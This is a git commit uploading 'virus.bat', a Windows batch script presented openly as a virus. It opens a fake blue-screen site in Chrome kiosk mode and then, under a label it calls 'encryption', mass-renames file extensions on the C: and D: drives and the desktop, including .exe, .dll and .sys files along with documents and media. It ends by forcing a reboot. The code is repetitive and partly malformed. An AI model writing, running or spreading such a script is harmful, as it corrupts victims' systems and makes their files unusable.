6d55fd68d3171de8da802136c280eb61b4f0363b
Baumhau <139624810+Baumhau@users.noreply.github.com>
2024-08-14 07:22:39 +0200

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,183 @@
+@echo off & setlocal enabledelayedexpansion
+:start
+rem
+set ip=142.251.39.100
+rem 
+echo test !ip!
+ping -n 1 %ip% | find /I /c "TTL" >nul
+if  %errorlevel% GEQ  1 (
+  exit
+) else (
+  start chrome.exe -kiosk https://fakebsod.com/windows-8-and-10
+  )
+goto encryption
+:encryption
+cls & color 0a
+cd C:
+REN *.asar *.j91w
+REN *.dat *.ö1e3
+REN *.PAK *.j5t7
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.pcx *.j9k1
+REN *.png *.8J2n
+REN *.jpg *.7k3l
+REN *.jpeg *.7a3L
+REN *.pdf *.g6h1
+REN *.txt *.e5g0
+REN *.doc *.h4t9
+REN *.docs *.h4rt
+REN *.xls *.z8u0
+REN *.xml *.z8ü1
+REN *.swf *.m7p6
+REN *.asf *.j8q1
+REN *.avi *.k0m1
+REN *.mov *.l0g5
+REN *mp4  *.j4l0
+REN *.mp3 *.m2p0
+REN *.WAV *.k0l1
+REN *.WMA *.lt7q
+cd D:
+REN *.asar *.j91w
+REN *.dat *.ö1e3
+REN *.PAK *.j5t7
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.pcx *.j9k1
+REN *.png *.8J2n
+REN *.jpg *.7k3l
+REN *.jpeg *.7a3L
+REN *.pdf *.g6h1
+REN *.txt *.e5g0
+REN *.doc *.h4t9
+REN *.docs *.h4rt
+REN *.xls *.z8u0
+REN *.xml *.z8ü1
+REN *.swf *.m7p6
+REN *.asf *.j8q1
+REN *.avi *.k0m1
+REN *.mov *.l0g5
+REN *mp4  *.j4l0
+REN *.mp3 *.m2p0
+REN *.WAV *.k0l1
+REN *.WMA *.lt7q
+cd C:Desktop
+REN *.asar *.j91w
+REN *.dat *.ö1e3
+REN *.PAK *.j5t7
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.cmd *.sI09
+REN *.exe *.1Je9
+REN *.log *.439a
+REN *.ini *.3KM1
+REN *.dll *.38Jl
+REN *.bin *.3J81
+REN *.txt *.2M1A
+REN *.sys *.8j3J
+REN *.lnk *.9K2M
+REN *.png *.8J2n
+REN *.exe *.3hxD
+REN *.pcx *.j9k1
+REN *.png *.8J2n
+REN *.jpg *.7k3l
+REN *.jpeg *.7a3L
+REN *.pdf *.g6h1
+REN *.txt *.e5g0
+REN *.doc *.h4t9
+REN *.docs *.h4rt
+REN *.xls *.z8u0
+REN *.xml *.z8ü1
+REN *.swf *.m7p6
+REN *.asf *.j8q1
+REN *.avi *.k0m1
+REN *.mov *.l0g5
+REN *mp4  *.j4l0
+REN *.mp3 *.m2p0
+REN *.WAV *.k0l1
+REN *.WMA *.lt7q
+color 0a & mode 1000 & cls
+shutdown -r 
+exit
